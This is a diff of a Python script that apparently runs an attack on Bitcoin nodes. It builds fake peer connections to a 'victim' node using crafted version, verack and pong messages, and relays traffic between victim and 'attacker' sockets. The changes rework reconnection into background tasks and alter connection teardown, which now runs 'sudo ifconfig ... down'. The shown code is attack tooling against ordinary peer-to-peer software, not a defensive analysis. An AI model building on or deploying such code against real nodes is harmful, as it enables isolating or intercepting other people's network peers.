@@ -138,26 +138,26 @@ def version_packet(src_ip, dst_ip, src_port, dst_port):
 
 # Close a connection
 def close_connection(socket, mirror_socket, ip, port, interface):
+	successful = False
 	try:
 		socket.close()
-		if mirror_socket != None:
-			mirror_socket.close()
-	except: pass
-	try:
-		terminal(f'sudo ifconfig {interface} {ip} down')
-	except: pass
+		#if mirror_socket != None:
+		#	mirror_socket.close()
+	except: successful = False
+	terminal(f'sudo ifconfig {interface} {ip} down')
 	try:
 		if socket in identity_socket: identity_socket.remove(socket)
 		del socket
 
-		if mirror_socket != None:
-			if mirror_socket in identity_mirror_socket: identity_mirror_socket.remove(mirror_socket)
-			del mirror_socket
+		#if mirror_socket != None:
+		#	if mirror_socket in identity_mirror_socket: identity_mirror_socket.remove(mirror_socket)
+		#	del mirror_socket
 
 		if interface in identity_interface: identity_interface.remove(interface)
 		if (ip, port) in identity_address: identity_address.remove((ip, port))
-		print(f'Successfully closed connection to ({ip} : {port})')
-	except: pass
+	except: successful = False
+
+	print(f'Successfully closed connection to ({ip} : {port})')
 
 # Creates a fake connection to the victim
 def make_fake_connection(src_ip, dst_ip, verbose=True, attempt_number = 0):
@@ -230,6 +230,7 @@ def make_fake_connection(src_ip, dst_ip, verbose=True, attempt_number = 0):
 
 # Reconnect a peer
 def reconnect(the_socket, other_socket, src_ip, src_port, dst_ip, dst_port, interface, sniff_func):
+	time.sleep(1)
 	verbose = True
 
 	the_socket.close()
@@ -251,7 +252,6 @@ def reconnect(the_socket, other_socket, src_ip, src_port, dst_ip, dst_port, inte
 	if verbose: print(f'Connecting ({src_ip} : {src_port}) to ({dst_ip} : {dst_port})...')
 
 	while True:
-		print('Attempting connection...')
 		try:
 			s.connect((dst_ip, dst_port))
 			version = version_packet(src_ip, dst_ip, src_port, dst_port)
@@ -261,10 +261,15 @@ def reconnect(the_socket, other_socket, src_ip, src_port, dst_ip, dst_port, inte
 			s.sendall(verack.to_bytes())
 			verack = s.recv(1024)
 			break
-		except: time.sleep(5)
+		except:
+			print('Attempting connection again in 5 seconds...')
+			time.sleep(5)
 
 	identity_socket.append(s)
+	identity_address.append((src_ip, src_port))
+	identity_interface.append(interface)
 	create_task('Reconnected ' + src_ip, sniff_func, s, other_socket, src_ip, src_port, dst_ip, dst_port, interface)
+
 	print(f'Successfully reconnected ({dst_ip} : {dst_port})')
 
 
@@ -372,7 +377,7 @@ def packet_received(thread, parent_thread, packet, socket, mirror_socket, src_ip
 			socket.sendall(pong.to_bytes())
 		except Exception as e:
 			print(f'Lost connection to ({victim_ip} : {victim_port})')
-			reconnect(socket, mirror_socket, src_ip, src_port, victim_ip, victim_port, interface, sniff_func)
+			create_task('Reconnecting ' + victim_ip, reconnect, socket, mirror_socket, src_ip, src_port, victim_ip, victim_port, interface, sniff_func)
 	elif msg_type == 'version': pass # Ignore version
 	elif msg_type == 'verack': pass # Ignore verack
 	else:
@@ -382,7 +387,7 @@ def packet_received(thread, parent_thread, packet, socket, mirror_socket, src_ip
 		except Exception as e:
 			parent_thread.stop()
 			print(f'Lost connection to ({attacker_ip} : {attacker_port})')
-			reconnect(mirror_socket, socket, src_ip, src_port, attacker_ip, attacker_port, interface, sniff_func)
+			create_task('Reconnecting ' + attacker_ip, reconnect, mirror_socket, socket, src_ip, src_port, attacker_ip, attacker_port, interface, sniff_func)
 
 
 		#close_connection(socket, mirror_socket, from_ip, from_port, interface)
@@ -445,8 +450,8 @@ def mirror_packet_received(thread, parent_thread, packet, socket, orig_socket, s
 		try:
 			socket.sendall(pong.to_bytes())
 		except Exception as e:
-			print(f'Lost connection to ({victim_ip} : {victim_port})')
-			reconnect(socket, orig_socket, src_ip, src_port, attacker_ip, attacker_port, interface, sniff_func)
+			print(f'Lost connection to ({attacker_ip} : {attacker_port})')
+			create_task('Reconnecting ' + attacker_ip, reconnect, socket, orig_socket, src_ip, src_port, attacker_ip, attacker_port, interface, sniff_func)
 	else:
 		if orig_socket == None: return False # If the destination socket isn't running, ignore packet
 		try:
@@ -454,7 +459,7 @@ def mirror_packet_received(thread, parent_thread, packet, socket, orig_socket, s
 		except Exception as e:
 			parent_thread.stop()
 			print(f'Lost connection to ({victim_ip} : {victim_port})')
-			reconnect(orig_socket, socket, src_ip, src_port, victim_ip, victim_port, interface, sniff_func)
+			create_task('Reconnecting ' + victim_ip, reconnect, orig_socket, socket, src_ip, src_port, victim_ip, victim_port, interface, sniff_func)
 
 		# print("Closing socket because of error: " + str(e))
 		# parent_thread.stop()
